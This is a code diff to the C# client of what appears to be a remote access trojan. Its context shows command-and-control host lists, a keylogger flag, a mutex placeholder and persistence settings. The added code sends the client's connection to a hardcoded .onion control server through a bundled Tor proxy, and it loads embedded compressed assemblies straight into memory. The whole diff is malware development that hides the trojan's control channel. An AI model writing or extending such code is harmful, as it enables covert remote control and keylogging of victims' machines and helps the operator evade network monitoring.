@@ -8,11 +8,15 @@ using System.IO;
 using System.Net.Sockets;
 using System.IO.Compression;
 using System.Collections.Generic;
+using System.Net;
+using System.Threading.Tasks;
+using Bridge;
+using Starksoft.Aspen.Proxy;
 //[assembly: System.Reflection.AssemblyVersion("1.0.0.1")]
 //[assembly: System.Reflection.AssemblyFileVersion("1.0.0.1")]
 //[assembly: System.Reflection.AssemblyTitle("%Client%")]
 //[assembly: System.Reflection. AssemblyDescription("%Description")]
-[assembly: System.Runtime.Versioning.TargetFramework(".NETFramework,Version=v4.5", FrameworkDisplayName = ".NET Framework 4.5")]
+//[assembly: System.Runtime.Versioning.TargetFramework(".NETFramework,Version=v4.5", FrameworkDisplayName = ".NET Framework 4.5")]
 [assembly: ComVisible(false)]
 //[assembly: System.Reflection.AssemblyProduct("%Product%")]
 //[assembly: System.Reflection.AssemblyCopyright("%Copyright%")]
@@ -24,7 +28,10 @@ namespace Client
     {
         public static List<string> hostLists = new List<string>() { "qsdqsdqsdkjsdljk.com:7521", "127.0.0.1:7788", "127.0.0.1:9988", "127.0.0.1:9875" };
         public static List<Host> hosts = new List<Host>();
-        public static string generalKey = "123456789";
+        public static string onionHost = "mjxtze3h3wy2exmlgzxzwhugwzn7l4hkkfazadvzadexi6mbj7w7wsqd.onion:8008";
+        public static List<string> onionHosts = new List<string>() { "mjxtze3h3wy2exmlgzxzwhugwzn7l4hkkfazadvzadexi6mbj7w7wsqd.onion:8008" };
+        public static bool torRoute = true;
+        public static string generalKey = "";
         public static bool offKeylog = false;
         public static string mutex = "%MUTEX%";
         public static Offline.Persistence.Method installationMethod = Offline.Persistence.Method.NONE;
@@ -49,6 +56,52 @@ namespace Client
 
             byte[] packetLib = new byte[] { };
 
+            byte[] bridge = new byte[] { };
+            byte[] net = new byte[] { };
+            byte[] aspen = new byte[] { };
+
+            if (e.Name.Contains("Net"))
+            {
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (MemoryStream compressedStream = new MemoryStream(net))
+                    {
+                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                        {
+                            deflater.CopyTo(ms);
+                        }
+                    }
+                    return System.Reflection.Assembly.Load(ms.ToArray());
+                }
+            }
+            if (e.Name.Contains("aspen"))
+            {
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (MemoryStream compressedStream = new MemoryStream(aspen))
+                    {
+                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                        {
+                            deflater.CopyTo(ms);
+                        }
+                    }
+                    return System.Reflection.Assembly.Load(ms.ToArray());
+                }
+            }
+            if (e.Name.Contains("Bridge"))
+            {
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (MemoryStream compressedStream = new MemoryStream(bridge))
+                    {
+                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                        {
+                            deflater.CopyTo(ms);
+                        }
+                    }
+                    return System.Reflection.Assembly.Load(ms.ToArray());
+                }
+            }
             if (e.Name.Contains("Packet"))
             {
                 using (MemoryStream ms = new MemoryStream())
@@ -225,10 +278,15 @@ namespace Client
             readPacketAsync = new ReadPacketAsync(PacketParser);
             sendDataAsync = new SendDataAsync(SendData);
         }
-
+        private static bool awake = false;
+        private async void StartProxy()
+        {
+            if (Router.StartProxy())
+                awake = true;
+        }
         public void ConnectStart()
         {
-
+            
             if (indexHost == Config.hosts.Count)
                 indexHost = 0;
 
@@ -236,8 +294,17 @@ namespace Client
             indexHost++;
 
             Thread.Sleep(125);
-
-            connectAsync = new ConnectAsync(Connect);
+            if (Config.torRoute)
+            {
+                StartProxy();
+                do { Thread.Sleep(1000); }
+                while (!awake);
+                connectAsync = new ConnectAsync(Connect);
+            }
+            else 
+            {
+                connectAsync = new ConnectAsync(Connect);
+            }
             connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
         }
 
@@ -245,9 +312,23 @@ namespace Client
         {
             try
             {
-                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
-                socket.Connect(host.host, host.port);
+                if (Config.torRoute)
+                {
+                    string[] _var = Config.onionHost.Split(':');
+                    int _tp = int.Parse(_var[1]);
+                    Socks5ProxyClient proxyClient = new Socks5ProxyClient("127.0.0.1", 39899, "", "");
+                    TcpClient client = proxyClient.CreateConnection(_var[0], 8008);
+                    socket = proxyClient.CreateConnection(_var[0], _tp).Client;
+
+                    Console.WriteLine("Connected");
+                  //  socket = OraclesBridge.ClientProxy.ConnectToSocks5Proxy("127.0.0.1", 39899, _var[0], (ushort)_tp, "", "");
+                }
+                else
+                {
+                    socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
+                    socket.Connect(host.host, host.port);
+                }
                 return true;
             }
             catch { }
@@ -396,6 +477,56 @@ namespace Client
             {
                 return;
             }
+        }
+    }
+    internal class Router
+    {
+        internal static TorSharpProxy proxy;
+        internal static bool Alive = false;
+
+        internal static bool StartProxy()
+        {
+            Proxify();
+            do { Thread.Sleep(2000); }
+            while (!Alive);
+            return Alive;
+        }
+        private static async Task Proxify()
+        {
+            //string _ = $"{port} 127.0.0.1:{port}";
+            var settings = new TorSharpSettings
+            {
+                ZippedToolsDirectory = Path.Combine(Path.GetTempPath(), "_\\TorZipped"),
+                ExtractedToolsDirectory = Path.Combine(Path.GetTempPath(), "_\\TorExtracted"),
+                PrivoxySettings = { Port = 22700 },
+                TorSettings =
+            {
+                SpinUpServer = false,
+                HiddenServiceDir = "HiddenService",
+                HiddenServicePort = "",
+                SocksPort = 39899,
+                ControlPort = 33790,
+                // ORPort = "9003",
+                ControlPassword = "foobar",
+            },
+            };
+            // download tools
+         //   await new TorSharpToolFetcher(settings, new HttpClient()).FetchAsync();
+
+            // execute
+            proxy = new TorSharpProxy(settings);
+
+         //   var handler = new HttpClientHandler
+         //   {
+        //        Proxy = new WebProxy(new Uri("http://localhost:" + settings.PrivoxySettings.Port))
+         //   };
+            await proxy.ConfigureAndStartAsync();
+            // Console.WriteLine(await httpClient.GetStringAsync("http://api.ipify.org"));
+            // await proxy.GetNewIdentityAsync();
+            //Console.WriteLine(await httpClient.GetStringAsync("http://api.ipify.org"));
+            Alive = true;
+            // proxy.Stop();
+            
         }
     }
 }
